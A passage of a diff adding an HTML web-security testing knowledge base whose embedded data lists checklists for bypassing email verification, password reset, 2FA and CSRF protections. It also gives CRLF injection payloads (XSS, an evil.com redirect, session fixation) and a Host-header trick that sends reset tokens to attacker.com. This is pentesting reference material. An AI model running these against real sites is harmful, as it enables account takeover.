@@ -1,0 +1,2662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SecTest Hub — Cybersecurity Testing Knowledge Base</title>
+    <script src="https://cdn.tailwindcss.com">
+    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0a0a;
+            color: #e8edf2;
+            overflow-x: hidden;
+        }
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #141414;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2a3a3a;
+            border-radius: 8px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #3a5a5a;
+        }
+        .glass {
+            background: rgba(16, 20, 20, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(0, 212, 170, 0.08);
+        }
+        .sidebar-glass {
+            background: rgba(10, 12, 12, 0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-right: 1px solid rgba(0, 212, 170, 0.06);
+        }
+        .card-bg {
+            background: rgba(18, 22, 22, 0.8);
+            border: 1px solid rgba(0, 212, 170, 0.07);
+            transition: all 0.2s ease;
+        }
+        .card-bg:hover {
+            border-color: rgba(0, 212, 170, 0.2);
+            background: rgba(22, 28, 28, 0.85);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+        }
+        .accent-border {
+            border-color: rgba(0, 212, 170, 0.15);
+        }
+        .accent-text {
+            color: #00d4aa;
+        }
+        .accent-bg {
+            background: rgba(0, 212, 170, 0.08);
+        }
+        .accent-bg-hover:hover {
+            background: rgba(0, 212, 170, 0.14);
+        }
+        .btn-accent {
+            background: rgba(0, 212, 170, 0.12);
+            color: #00d4aa;
+            border: 1px solid rgba(0, 212, 170, 0.15);
+            transition: all 0.2s ease;
+        }
+        .btn-accent:hover {
+            background: rgba(0, 212, 170, 0.2);
+            border-color: rgba(0, 212, 170, 0.3);
+        }
+        .btn-primary {
+            background: #00d4aa;
+            color: #0a0a0a;
+            font-weight: 600;
+            transition: all 0.2s ease;
+        }
+        .btn-primary:hover {
+            background: #00e6b8;
+            box-shadow: 0 0 24px rgba(0, 212, 170, 0.25);
+        }
+        .code-block {
+            background: #0d1111;
+            border: 1px solid rgba(0, 212, 170, 0.08);
+            border-radius: 10px;
+            padding: 1rem 1.25rem;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+            font-size: 0.82rem;
+            line-height: 1.7;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            color: #d4e0e8;
+            position: relative;
+        }
+        .code-block .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            color: #8a9aa8;
+            padding: 0.25rem 0.75rem;
+            border-radius: 6px;
+            font-size: 0.7rem;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            opacity: 0.6;
+        }
+        .code-block .copy-btn:hover {
+            background: rgba(0, 212, 170, 0.12);
+            color: #00d4aa;
+            opacity: 1;
+        }
+        .code-block .copy-btn.copied {
+            background: rgba(0, 212, 170, 0.15);
+            color: #00d4aa;
+            border-color: rgba(0, 212, 170, 0.2);
+        }
+        .search-highlight {
+            background: rgba(0, 212, 170, 0.2);
+            color: #00d4aa;
+            padding: 0 0.1rem;
+            border-radius: 2px;
+        }
+        .nav-link {
+            color: #8a9aa8;
+            transition: all 0.15s ease;
+            cursor: pointer;
+            font-size: 0.875rem;
+            padding: 0.4rem 0.6rem;
+            border-radius: 6px;
+        }
+        .nav-link:hover {
+            color: #e8edf2;
+            background: rgba(255, 255, 255, 0.04);
+        }
+        .nav-link.active {
+            color: #00d4aa;
+            background: rgba(0, 212, 170, 0.08);
+        }
+        .category-link {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0.5rem 0.75rem;
+            border-radius: 8px;
+            color: #b0c0cc;
+            font-size: 0.82rem;
+            transition: all 0.15s ease;
+            cursor: pointer;
+            border-left: 2px solid transparent;
+        }
+        .category-link:hover {
+            background: rgba(255, 255, 255, 0.03);
+            color: #e8edf2;
+        }
+        .category-link.active {
+            background: rgba(0, 212, 170, 0.06);
+            color: #00d4aa;
+            border-left-color: #00d4aa;
+        }
+        .category-link .count {
+            background: rgba(255, 255, 255, 0.04);
+            padding: 0.1rem 0.55rem;
+            border-radius: 12px;
+            font-size: 0.7rem;
+            color: #8a9aa8;
+        }
+        .category-link.active .count {
+            background: rgba(0, 212, 170, 0.12);
+            color: #00d4aa;
+        }
+        .stat-card {
+            background: rgba(16, 20, 20, 0.7);
+            border: 1px solid rgba(0, 212, 170, 0.06);
+            border-radius: 12px;
+            padding: 1.25rem 1.5rem;
+            transition: all 0.2s ease;
+        }
+        .stat-card:hover {
+            border-color: rgba(0, 212, 170, 0.12);
+            background: rgba(20, 26, 26, 0.7);
+        }
+        .stat-card .number {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #00d4aa;
+            letter-spacing: -0.02em;
+        }
+        .stat-card .label {
+            color: #8a9aa8;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            font-weight: 500;
+        }
+        .test-card {
+            background: rgba(16, 20, 20, 0.6);
+            border: 1px solid rgba(0, 212, 170, 0.05);
+            border-radius: 12px;
+            padding: 1.25rem 1.5rem;
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+        .test-card:hover {
+            border-color: rgba(0, 212, 170, 0.15);
+            background: rgba(20, 26, 26, 0.7);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
+        }
+        .test-card .badge {
+            display: inline-block;
+            background: rgba(0, 212, 170, 0.06);
+            color: #00d4aa;
+            font-size: 0.65rem;
+            padding: 0.1rem 0.6rem;
+            border-radius: 12px;
+            font-weight: 500;
+            letter-spacing: 0.02em;
+            border: 1px solid rgba(0, 212, 170, 0.06);
+            margin-right: 0.3rem;
+        }
+        .detail-section {
+            margin-bottom: 1.75rem;
+        }
+        .detail-section h3 {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: #6a8a8a;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+        }
+        .detail-section .content {
+            color: #d0dce6;
+            font-size: 0.92rem;
+            line-height: 1.8;
+        }
+        .detail-section .content p {
+            margin-bottom: 0.5rem;
+        }
+        .breadcrumb {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-size: 0.8rem;
+            color: #6a8a8a;
+            flex-wrap: wrap;
+        }
+        .breadcrumb a {
+            color: #8a9aa8;
+            transition: color 0.15s ease;
+            cursor: pointer;
+        }
+        .breadcrumb a:hover {
+            color: #00d4aa;
+        }
+        .breadcrumb .separator {
+            color: #3a4a4a;
+        }
+        .breadcrumb .current {
+            color: #d0dce6;
+        }
+        .tag {
+            display: inline-block;
+            background: rgba(0, 212, 170, 0.05);
+            color: #6a9a9a;
+            font-size: 0.7rem;
+            padding: 0.1rem 0.6rem;
+            border-radius: 12px;
+            border: 1px solid rgba(0, 212, 170, 0.06);
+            margin-right: 0.3rem;
+            margin-bottom: 0.2rem;
+        }
+        .sidebar-category-section {
+            max-height: calc(100vh - 200px);
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+        .sidebar-category-section::-webkit-scrollbar {
+            width: 3px;
+        }
+        .sidebar-category-section::-webkit-scrollbar-thumb {
+            background: #2a3a3a;
+            border-radius: 8px;
+        }
+        .search-input {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            padding: 0.5rem 1rem 0.5rem 2.4rem;
+            color: #e8edf2;
+            font-size: 0.85rem;
+            width: 100%;
+            transition: all 0.2s ease;
+            outline: none;
+        }
+        .search-input:focus {
+            border-color: rgba(0, 212, 170, 0.25);
+            background: rgba(255, 255, 255, 0.05);
+            box-shadow: 0 0 0 3px rgba(0, 212, 170, 0.04);
+        }
+        .search-input::placeholder {
+            color: #4a5a5a;
+        }
+        .filter-select {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            padding: 0.4rem 0.8rem;
+            color: #e8edf2;
+            font-size: 0.8rem;
+            outline: none;
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+        .filter-select:focus {
+            border-color: rgba(0, 212, 170, 0.25);
+        }
+        .filter-select option {
+            background: #141a1a;
+            color: #e8edf2;
+        }
+        .nav-btn {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 8px;
+            padding: 0.4rem 0.9rem;
+            color: #8a9aa8;
+            font-size: 0.78rem;
+            transition: all 0.15s ease;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+        .nav-btn:hover {
+            background: rgba(255, 255, 255, 0.06);
+            color: #e8edf2;
+            border-color: rgba(255, 255, 255, 0.1);
+        }
+        .nav-btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+        .bookmark-btn {
+            background: transparent;
+            border: none;
+            color: #4a5a5a;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            padding: 0.2rem 0.4rem;
+            border-radius: 6px;
+        }
+        .bookmark-btn:hover {
+            color: #8a9aa8;
+            background: rgba(255, 255, 255, 0.03);
+        }
+        .bookmark-btn.active {
+            color: #f0c060;
+        }
+        .bookmark-btn.active:hover {
+            color: #f0c060;
+        }
+        .mobile-menu-btn {
+            background: transparent;
+            border: none;
+            color: #8a9aa8;
+            cursor: pointer;
+            padding: 0.3rem;
+            border-radius: 6px;
+            transition: all 0.15s ease;
+        }
+        .mobile-menu-btn:hover {
+            background: rgba(255, 255, 255, 0.04);
+            color: #e8edf2;
+        }
+        .sidebar-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 40;
+            display: none;
+        }
+        .sidebar-overlay.open {
+            display: block;
+        }
+        @media (max-width: 1024px) {
+            .sidebar-desktop {
+                display: none;
+            }
+            .sidebar-mobile-open .sidebar-desktop {
+                display: block;
+                position: fixed;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                width: 300px;
+                z-index: 50;
+                background: #0c0e0e;
+                border-right: 1px solid rgba(0, 212, 170, 0.06);
+                padding: 1rem;
+                overflow-y: auto;
+            }
+            .sidebar-mobile-open .sidebar-overlay {
+                display: block;
+            }
+        }
+        @media (min-width: 1025px) {
+            .sidebar-mobile-toggle {
+                display: none;
+            }
+            .sidebar-overlay {
+                display: none !important;
+            }
+        }
+        @media (max-width: 640px) {
+            .stat-card .number {
+                font-size: 1.5rem;
+            }
+            .stat-card {
+                padding: 0.9rem 1rem;
+            }
+            .test-card {
+                padding: 1rem;
+            }
+            .code-block {
+                font-size: 0.7rem;
+                padding: 0.75rem 1rem;
+            }
+            .code-block .copy-btn {
+                font-size: 0.6rem;
+                padding: 0.15rem 0.5rem;
+            }
+        }
+        .fade-in {
+            animation: fadeIn 0.25s ease;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(6px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .markdown-content ul,
+        .markdown-content ol {
+            padding-left: 1.5rem;
+            margin: 0.3rem 0;
+        }
+        .markdown-content li {
+            margin-bottom: 0.15rem;
+        }
+        .markdown-content code {
+            background: rgba(0, 212, 170, 0.06);
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.82em;
+            color: #b0d4d4;
+        }
+        .markdown-content pre {
+            margin: 0.5rem 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="root"></div>
+
+    <!-- Load React and ReactDOM from CDN -->
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js">
+    </script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js">
+    </script>
+
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest">
+    </script>
+
+    <script>
+        // ============================================================
+        // DATA — All test cases parsed from the source Markdown
+        // ============================================================
+        const TEST_DATA = {
+            categories: {
+                "Email Verification Bypass": {
+                    description: "Test cases for bypassing email verification mechanisms through parameter manipulation, token reuse, and response tampering.",
+                    testCases: [{
+                        id: 1,
+                        title: "OTP Parameter Manipulation",
+                        bugType: ["email-verification-bypass", "parameter-manipulation"],
+                        sections: {
+                            "Steps": "1. Create account and receive OTP verification\n2. Capture OTP verification request in Burp\n3. Look for `email` parameter in the request\n4. Replace attacker's email with victim's email\n5. Submit valid OTP with victim's email\n6. Check if account now shows victim's email\n7. Logout and login with victim's email & password"
+                        }
+                    }, {
+                        id: 2,
+                        title: "Reusing Old Verification Link",
+                        bugType: ["email-verification-bypass", "token-reuse"],
+                        sections: {
+                            "Steps": "1. Sign up as `attacker@mail.com`\n2. Receive confirmation email - DO NOT open\n3. Navigate to account settings without verifying\n4. Change email to `victim@mail.com`\n5. Receive new verification link for victim\n6. Instead of new link, open the previous link from attacker's inbox\n7. If victim's email gets verified, this is a bypass"
+                        }
+                    }, {
+                        id: 3,
+                        title: "Forced Browsing",
+                        bugType: ["email-verification-bypass", "forced-browsing"],
+                        sections: {
+                            "Steps": "1. Sign up with `attacker@mail.com`\n2. Don't verify email\n3. Directly navigate to files/endpoints that should be accessible only after verification\n4. Check if you can access protected resources"
+                        }
+                    }, {
+                        id: 4,
+                        title: "Response/Status Code Manipulation",
+                        bugType: ["email-verification-bypass", "response-manipulation"],
+                        sections: {
+                            "Steps": "1. Trigger verification check\n2. Intercept response\n3. Replace error status (403) with success status (200)\n4. Check if verification bypass is successful"
+                        }
+                    }, {
+                        id: 5,
+                        title: "HTTP Protocol Issue",
+                        bugType: ["email-verification-bypass", "insecure-protocol"],
+                        sections: {
+                            "Impact": "Email OTP link sent over unsecured HTTP protocol. Anyone from intermediate computers can sniff and verify the email.",
+                            "Mitigation": "Always generate email OTP links with secured HTTPS protocol."
+                        }
+                    }]
+                },
+                "Password Reset Flaw": {
+                    description: "Test cases for identifying flaws in password reset functionality including ID tampering, token leakage, and predictability issues.",
+                    testCases: [{
+                        id: 6,
+                        title: "Password Reset - ID Parameter Tampering",
+                        bugType: ["password-reset-flaw", "idor"],
+                        sections: {
+                            "Steps": "1. Request password reset for attacker account\n2. Click the reset link from email\n3. Enter new password\n4. Intercept the password confirmation request\n5. Change user ID/email/username to victim's ID\n6. Submit request\n7. Victim's password is now changed"
+                        }
+                    }, {
+                        id: 7,
+                        title: "Password Reset - Host Header Poisoning",
+                        bugType: ["password-reset-flaw", "header-poisoning"],
+                        sections: {
+                            "Steps": "1. Request password reset\n2. Intercept request\n3. Modify Host header or add:\n- `X-Forwarded-Host: attacker.com`\n- `Referrer: attacker.com`\n4. Check if reset token is sent to attacker's server"
+                        }
+                    }, {
+                        id: 8,
+                        title: "Token Leak in Response",
+                        bugType: ["password-reset-flaw", "token-leak"],
+                        sections: {
+                            "Steps": "1. Register new account (or request password reset)\n2. Intercept the response\n3. Check if response contains:\n- Verification link\n- Token\n- OTP"
+                        }
+                    }, {
+                        id: 9,
+                        title: "Reset Link Not Expiring After Use",
+                        bugType: ["password-reset-flaw", "token-expiration"],
+                        sections: {
+                            "Steps": "1. Request password reset - get link\n2. Use the link to reset password\n3. Request password reset again\n4. Try to use the old (already used) reset link\n5. If it works → vulnerable"
+                        }
+                    }, {
+                        id: 10,
+                        title: "Reset Link Not Expiring with New Token",
+                        bugType: ["password-reset-flaw", "token-invalidation"],
+                        sections: {
+                            "Steps": "1. Request password reset - get link\n2. Request password reset again - get new link\n3. Try to use the old (1st) reset link\n4. If it works → vulnerable"
+                        }
+                    }, {
+                        id: 11,
+                        title: "Reset Token Predictability",
+                        bugType: ["password-reset-flaw", "predictable-token"],
+                        sections: {
+                            "Sequential Tokens": "`token001`, `token002`, `token003` → can be brute-forced",
+                            "Short Tokens": "`abc123` or `qwerty` → easily brute-forced",
+                            "Predictable Patterns": "`userID_timestamp` → easily guessable",
+                            "Static Tokens": "Fixed token for all reset requests"
+                        }
+                    }, {
+                        id: 12,
+                        title: "Reset Token Encoding/Decoding",
+                        bugType: ["password-reset-flaw", "token-encoding"],
+                        sections: {
+                            "Steps": "1. Observe reset token link (it's encoded)\n2. Decode it using Base64, MD5, etc.\n3. If easily guessable, modify and encode\n4. Use modified token for reset"
+                        }
+                    }, {
+                        id: 13,
+                        title: "Email Change After Reset Request",
+                        bugType: ["password-reset-flaw", "logic-flaw"],
+                        sections: {
+                            "Steps": "1. Request password reset - get link\n2. Don't open reset link\n3. Login and change account email\n4. Use old reset link\n5. If it works → vulnerable"
+                        }
+                    }, {
+                        id: 14,
+                        title: "Reset After Email Update",
+                        bugType: ["password-reset-flaw", "logic-flaw"],
+                        sections: {
+                            "Steps": "1. Request password reset - get link\n2. Use link to set new password\n3. Update account email\n4. Try old reset link\n5. If it works → vulnerable"
+                        }
+                    }, {
+                        id: 15,
+                        title: "Time-Based Token Manipulation",
+                        bugType: ["password-reset-flaw", "token-manipulation"],
+                        sections: {
+                            "Steps": "1. Get reset token with timestamp\n2. Decode the token\n3. Modify expiration time\n4. Encode and reuse\n5. If it works → vulnerable"
+                        }
+                    }, {
+                        id: 16,
+                        title: "Cross-Account Reset via Email Parameter",
+                        bugType: ["password-reset-flaw", "idor"],
+                        sections: {
+                            "Steps": "1. Enter attacker's email for reset\n2. Get link to attacker's email\n3. Intercept the reset request\n4. Change email to victim's email\n5. Reset victim's password"
+                        }
+                    }]
+                },
+                "Session Management": {
+                    description: "Test cases for session management issues including invalidation, cookie reuse, and 2FA session handling.",
+                    testCases: [{
+                        id: 17,
+                        title: "Invalid Session After Logout",
+                        bugType: ["session-mgmt", "session-invalidation"],
+                        sections: {
+                            "Steps": "1. Login in two different browsers\n2. From Browser 1, logout using \"Log Out From All Devices\"\n3. Check Browser 2 - can you still perform actions?\n4. If yes → vulnerable"
+                        }
+                    }, {
+                        id: 18,
+                        title: "Invalid Session After Password Reset",
+                        bugType: ["session-mgmt", "session-invalidation"],
+                        sections: {
+                            "Steps": "1. Login in two different browsers\n2. In Browser 1, change password\n3. Check Browser 2 - can you still perform actions?\n4. If yes → vulnerable"
+                        }
+                    }, {
+                        id: 19,
+                        title: "Session Cookie Reuse",
+                        bugType: ["session-mgmt", "cookie-reuse"],
+                        sections: {
+                            "Steps": "1. Login and copy session cookies\n2. Logout or change password\n3. Clear browser cookies\n4. Paste the copied cookies\n5. Refresh page - still logged in?"
+                        }
+                    }, {
+                        id: 20,
+                        title: "2FA Doesn't Expire Previous Sessions",
+                        bugType: ["session-mgmt", "2fa-session"],
+                        sections: {
+                            "Steps": "1. Login to account\n2. Enable 2FA\n3. Check if previously active sessions are invalidated"
+                        }
+                    }]
+                },
+                "2FA Bypass": {
+                    description: "Test cases for bypassing two-factor authentication through response manipulation, OTP leakage, and rate limiting issues.",
+                    testCases: [{
+                        id: 21,
+                        title: "Response Manipulation",
+                        bugType: ["2fa-bypass", "response-manipulation"],
+                        sections: {
+                            "Steps": "1. Enter wrong OTP\n2. Intercept response\n3. Change error response to success response\n4. Check if OTP is bypassed"
+                        }
+                    }, {
+                        id: 22,
+                        title: "Status Code Manipulation",
+                        bugType: ["2fa-bypass", "status-code-manipulation"],
+                        sections: {
+                            "Steps": "1. Enter wrong OTP\n2. Intercept response\n3. Change status code:\n- `403 Forbidden` → `200 OK`\n4. Check if bypass is successful"
+                        }
+                    }, {
+                        id: 23,
+                        title: "OTP Leakage in Response",
+                        bugType: ["2fa-bypass", "otp-leak"],
+                        sections: {
+                            "Steps": "1. Intercept response to OTP verification request\n2. Check if actual OTP is returned in response (client-side validation)"
+                        }
+                    }, {
+                        id: 24,
+                        title: "Code Reusability",
+                        bugType: ["2fa-bypass", "code-reuse"],
+                        sections: {
+                            "Steps": "1. Enable 2FA on attacker account\n2. Logout and login - get OTP\n3. Use same OTP twice\n4. Also check if previously requested codes expire when new code is requested"
+                        }
+                    }, {
+                        id: 25,
+                        title: "Lack of Rate Limit",
+                        bugType: ["2fa-bypass", "rate-limit"],
+                        sections: {
+                            "Steps": "1. Request 2FA code repeatedly (100-200 times)\n2. Check if any limitation is set\n3. Try to brute-force valid 2FA code\n4. Check for successful brute-force"
+                        }
+                    }, {
+                        id: 26,
+                        title: "OTP with null or 000000",
+                        bugType: ["2fa-bypass", "null-bypass"],
+                        sections: {
+                            "Steps": "1. Enter `null` or `000000` as OTP\n2. Check if it bypasses 2FA verification"
+                        }
+                    }, {
+                        id: 27,
+                        title: "CSRF on 2FA Disabling",
+                        bugType: ["2fa-bypass", "csrf"],
+                        sections: {
+                            "Steps": "1. Create CSRF POC for disabling 2FA\n2. Send to victim\n3. Check if 2FA gets disabled"
+                        }
+                    }, {
+                        id: 28,
+                        title: "Backup Code Abuse",
+                        bugType: ["2fa-bypass", "backup-code"],
+                        sections: {
+                            "Steps": "1. Generate backup codes\n2. Check if backup codes can be used multiple times\n3. Check if backup codes are predictable"
+                        }
+                    }, {
+                        id: 29,
+                        title: "Simple 2FA Parameter Manipulation",
+                        bugType: ["2fa-bypass", "parameter-manipulation"],
+                        sections: {
+                            "Steps": "1. Login with attacker credentials\n2. Complete 2FA verification\n3. Get dashboard link: `https://example.com/my-account?id=attacker`\n4. For victim:\n- Login with victim credentials\n- Instead of 2FA, use: `https://example.com/my-account?id=victim`\n5. If you access victim dashboard → vulnerable"
+                        }
+                    }, {
+                        id: 30,
+                        title: "Broken Logic 2FA Bypass",
+                        bugType: ["2fa-bypass", "logic-flaw"],
+                        sections: {
+                            "Steps": "1. Complete 2FA with attacker account\n2. Cookie contains: `verify=attacker`\n3. Change to: `verify=victim`\n4. Brute-force OTP if needed\n5. Access victim account"
+                        }
+                    }, {
+                        id: 31,
+                        title: "2FA Brute-Force via Macro",
+                        bugType: ["2fa-bypass", "brute-force"],
+                        sections: {
+                            "Steps": "1. Login with credentials\n2. On OTP page, wrong OTP causes logout\n3. Use Burp Macro for automation:\n- GET login page\n- POST credentials\n- GET OTP page\n4. Brute-force OTP with numeric payload\n5. Set min/max length as per OTP length"
+                        }
+                    }]
+                },
+                "CSRF (Cross-Site Request Forgery)": {
+                    description: "Test cases for CSRF vulnerabilities including method manipulation, token removal, and referrer bypass techniques.",
+                    testCases: [{
+                        id: 32,
+                        title: "CSRF - Change Request Method",
+                        bugType: ["csrf", "method-manipulation"],
+                        sections: {
+                            "Steps": "1. Intercept sensitive request (POST)\n2. Change method: `POST` → `GET`\n3. Remove CSRF token\n4. Generate CSRF POC\n5. Send to victim"
+                        }
+                    }, {
+                        id: 33,
+                        title: "CSRF - Remove Token Parameter",
+                        bugType: ["csrf", "token-removal"],
+                        sections: {
+                            "Steps": "1. Intercept sensitive request\n2. Remove CSRF token parameter\n3. Generate CSRF POC\n4. Send to victim"
+                        }
+                    }, {
+                        id: 34,
+                        title: "CSRF - Use Own Token",
+                        bugType: ["csrf", "token-reuse"],
+                        sections: {
+                            "Steps": "1. Get CSRF token from your own account\n2. Use it in victim's request\n3. Check if token is tied to user session"
+                        }
+                    }, {
+                        id: 35,
+                        title: "CSRF - Referrer Bypass",
+                        bugType: ["csrf", "referrer-bypass"],
+                        sections: {
+                            "Methods": "- Change `Referrer` to `Referer`\n- Bypass regex: `bank.com.attacker.com` or `attacker.com/bank.com`\n- Remove referrer header: `<meta name=\"referrer\" content=\"no-referrer\">`"
+                        }
+                    }, {
+                        id: 36,
+                        title: "CSRF - Clickjacking",
+                        bugType: ["csrf", "clickjacking"],
+                        sections: {
+                            "Steps": "1. Check if page is vulnerable to Clickjacking\n2. If yes, overlay sensitive buttons\n3. Trick victim into clicking"
+                        }
+                    }, {
+                        id: 37,
+                        title: "CSRF - Delete Account",
+                        bugType: ["csrf", "account-deletion"],
+                        sections: {
+                            "Steps": "1. Intercept account deletion request\n2. Generate CSRF POC using Burp\n3. Host HTML on your server\n4. Send link to victim\n5. Victim's account gets deleted"
+                        }
+                    }, {
+                        id: 38,
+                        title: "CSRF - Logout",
+                        bugType: ["csrf", "logout"],
+                        sections: {
+                            "Steps": "1. Create CSRF logout POC\n2. Send to victim\n3. Victim gets logged out"
+                        }
+                    }, {
+                        id: 39,
+                        title: "CSRF - Profile Field Deletion",
+                        bugType: ["csrf", "profile-modification"],
+                        sections: {
+                            "Steps": "1. Create CSRF form for deleting profile fields\n2. Send to admin\n3. Profile fields get deleted"
+                        }
+                    }, {
+                        id: 40,
+                        title: "CSRF - Pet/Animal Deletion",
+                        bugType: ["csrf", "data-deletion"],
+                        sections: {
+                            "Steps": "1. Create CSRF POC for deleting pet\n2. Need victim's animal ID\n3. Send to victim\n4. Pet gets deleted"
+                        }
+                    }]
+                },
+                "Brute Force Attacks": {
+                    description: "Test cases for brute force vulnerabilities including cookie brute force, password brute force, and DoS via long passwords.",
+                    testCases: [{
+                        id: 41,
+                        title: "Stay-Logged-In Cookie Brute Force",
+                        bugType: ["brute-force", "cookie-bruteforce"],
+                        sections: {
+                            "Steps": "1. Login with \"Remember Me\" enabled\n2. Decode cookie (Base64, MD5, etc.)\n3. Cookie contains username + password\n4. Generate cookie with encoded credentials\n5. Brute-force victim's credentials"
+                        }
+                    }, {
+                        id: 42,
+                        title: "Password Brute-Force via Password Change",
+                        bugType: ["brute-force", "password-bruteforce"],
+                        sections: {
+                            "Steps": "1. Login as attacker\n2. Go to password change page\n3. Intercept change password request\n4. Change attacker's ID to victim's ID\n5. Brute-force current password\n6. Watch for error messages"
+                        }
+                    }, {
+                        id: 43,
+                        title: "Long Password DoS Attack",
+                        bugType: ["dos", "long-password"],
+                        sections: {
+                            "Steps": "1. Use password of length 150-200 words\n2. Check if any length restriction exists\n3. If no restriction, use longer password\n4. Observe response time\n5. Application may crash"
+                        }
+                    }, {
+                        id: 44,
+                        title: "Permanent Account Lockout",
+                        bugType: ["dos", "account-lockout"],
+                        sections: {
+                            "Steps": "1. Enter valid email + wrong password\n2. Repeat 10-20 times\n3. Check if account gets blocked\n4. Check blocking time period\n5. If permanent or >30 min → vulnerable"
+                        }
+                    }, {
+                        id: 45,
+                        title: "Long String DoS",
+                        bugType: ["dos", "long-string"],
+                        sections: {
+                            "Steps": "1. Create account with fields (username, address, etc.)\n2. Input 1000+ characters\n3. Search for the account\n4. Check for:\n- Extended search time\n- Application crash (500 error)"
+                        }
+                    }]
+                },
+                "CORS Misconfiguration": {
+                    description: "Test cases for CORS misconfigurations including origin reflection, subdomain testing, and bypass techniques.",
+                    testCases: [{
+                        id: 46,
+                        title: "CORS Origin Reflection",
+                        bugType: ["cors", "origin-reflection"],
+                        sections: {
+                            "Steps": "1. Capture target website traffic\n2. Search for `Access-Control` headers\n3. Add Origin header:\n- `Origin: attacker.com`\n- `Origin: null`\n- `Origin: attacker.target.com`\n- `Origin: target.attacker.com`\n4. Check if origin is reflected in response"
+                        }
+                    }, {
+                        id: 47,
+                        title: "CORS Subdomain Testing",
+                        bugType: ["cors", "subdomain"],
+                        sections: {
+                            "Steps": "1. Find all subdomains: `subfinder -d target.com`\n2. Check alive domains: `httpx`\n3. Test each with Origin header\n4. Check for reflected origins"
+                        }
+                    }, {
+                        id: 48,
+                        title: "CORS Bypass Techniques",
+                        bugType: ["cors", "bypass"],
+                        sections: {
+                            "Testing": "- `Origin: null`\n- `Origin: attacker.com`\n- `Origin: attacker.target.com`\n- `Origin: attackertarget.com`\n- `Origin: sub.attackertarget.com`\n- Method change: GET ↔ POST\n- `Origin: sub.attacker%target.com`\n- `Origin: attacker.com/target.com`"
+                        }
+                    }]
+                },
+                "HTTP Response Splitting/CRLF Injection": {
+                    description: "Test cases for CRLF injection vulnerabilities including cookie injection, XSS via response splitting, and cache poisoning.",
+                    testCases: [{
+                        id: 49,
+                        title: "CRLF Injection - Cookie Injection",
+                        bugType: ["crlf-injection", "cookie-injection"],
+                        sections: {
+                            "Example": "```\nGET /%0d%0aSet-Cookie\\:CRLFInjection=MaliciousCookieSet HTTP/1.1\nHost: target.com\n```"
+                        }
+                    }, {
+                        id: 50,
+                        title: "CRLF Injection - XSS via Response Splitting",
+                        bugType: ["crlf-injection", "xss"],
+                        sections: {
+                            "Example": "```\nwww.target.com/%3f%0d%0aLocation:%0d%0aContent-Type\\:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E\n```"
+                        }
+                    }, {
+                        id: 51,
+                        title: "CRLF Injection - Phishing/Redirect",
+                        bugType: ["crlf-injection", "phishing"],
+                        sections: {
+                            "Example": "```\nGET /%0d%0aLocation:%20https://evil.com HTTP/1.1\nHost: target.com\n```"
+                        }
+                    }, {
+                        id: 52,
+                        title: "CRLF Injection - Session Fixation",
+                        bugType: ["crlf-injection", "session-fixation"],
+                        sections: {
+                            "Example": "```\nwww.target.com/%0d%0aSet-Cookie\\:session_id=942\n```"
+                        }
+                    }, {
+                        id: 53,
+                        title: "CRLF Injection - Web Cache Poisoning",
